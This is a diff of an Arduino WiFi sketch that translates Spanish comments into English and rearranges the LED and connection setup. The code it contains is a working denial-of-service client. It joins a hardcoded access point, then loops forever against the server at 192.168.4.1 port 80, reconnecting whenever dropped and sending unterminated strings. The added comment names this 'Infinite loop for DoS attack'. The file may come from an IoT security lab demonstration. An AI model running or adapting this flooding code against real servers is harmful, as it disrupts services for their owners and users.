@@ -1,55 +1,52 @@
-#include <WiFi.h>	//Declaro la libreria WiFi
+#include <WiFi.h>	// Include WiFi library
 
-#define FAN_PIN 2             	// Pin de conexión del transistor que activa el ventilador
+#define FAN_PIN 2    // Pin connected to transistor controlling the fan
 
 #define RED_PIN A0  
 #define GREEN_PIN A1
 #define BLUE_PIN A2
 
-char ssid[] = "WiFi-Access-Point";        // Se define el SSID
-char pass[] = "123456789";                    // Contraseña de conexión
-int keyIndex = 0;                             // Key-Index solo para WEP
 
-int status = WL_IDLE_STATUS;
+char ssid[] = "WiFi-Access-Point";        // Network SSID
+char pass[] = "123456789";                // Network password
 
-char serverSensor[] = "192.168.4.1";    	// IP del servidor
+char serverSensor[] = "192.168.4.1";    	// Server IP address
 
-WiFiClient client;							// Se define el cliente
+WiFiClient client;	// Define WiFi client
 
 void setup() {
-    while (status != WL_CONNECTED) {        // Si el estado es no conectado
-        status = WiFi.begin(ssid, pass);      // Intendo conectar con el punto de acceso
-        delay(1000);                          // Espero un segundo
-    }
-    
-    IPAddress local_ip(192, 168, 4, 2);
+    pinMode(RED_PIN, OUTPUT);     
+    pinMode(GREEN_PIN, OUTPUT);   
+    pinMode(BLUE_PIN, OUTPUT);   
+    digitalWrite(RED_PIN, LOW);       
+    digitalWrite(GREEN_PIN, HIGH);   
+    digitalWrite(BLUE_PIN, LOW);
+
+    IPAddress local_ip(192, 168, 4, 3);
     IPAddress gateway(192, 168, 4, 1);
     IPAddress subnet(255, 255, 255, 0);
-    WiFi.config(local_ip, gateway, subnet);	//Se configura IP del cliente
+    WiFi.config(local_ip, gateway, subnet);	// Configure client IP address
     
-    pinMode(GREEN_PIN, OUTPUT);      // Se define el pin del led verde como salida
-    pinMode(BLUE_PIN, OUTPUT);       // Se define el pin del led azul como salida
-    pinMode(RED_PIN, OUTPUT);        // Se define el pin del led rojo como salida
-    analogWrite(GREEN_PIN, 255);      // Se enciende el led verde
-    analogWrite(BLUE_PIN, 0);     // Se apaga el led azul
-    analogWrite(RED_PIN, 0);		// Se apaga el led rojo
-
-    digitalWrite(FAN_PIN, LOW);      		// Ventilador apagado
+    WiFi.begin(ssid, pass);
+    while (WiFi.status() != WL_CONNECTED) {
+        delay(1000);
+    }
 }
 
 void loop() {
-    if (client.connect(serverSensor, 80)) {   // Si estoy conectado al puerto 80
-        analogWrite(GREEN_PIN, 0);      // Apago el led verde
-        analogWrite(BLUE_PIN, 255);          // Enciendo el led azul
+    if (client.connect(serverSensor, 80)) {   // If connected to port 80
+        digitalWrite(GREEN_PIN, LOW);    
+        digitalWrite(RED_PIN, HIGH);  
 
-        while (1){								// Bucle infinito
-            if (!client.connected()) {          // Si me cierran la conexion
-                client.connect(serverSensor, 80);	//Vuelvo a conectarme
+        while (1){				// Infinite loop for DoS attack
+            if (!client.connected()) {          // If connection is closed
+                client.connect(serverSensor, 80);	// Reconnect
             }
-            client.print("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");	//Envio una cadena sin retorno
+            client.print("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");	// Send string without return
         }
-        analogWrite(GREEN_PIN, 255);      	// Enciendo el led verde
-        analogWrite(BLUE_PIN, 0);        // Apago el led azul
+
+        digitalWrite(RED_PIN, LOW);        
+        digitalWrite(GREEN_PIN, HIGH);  
     }
 
     delay(2000);                    
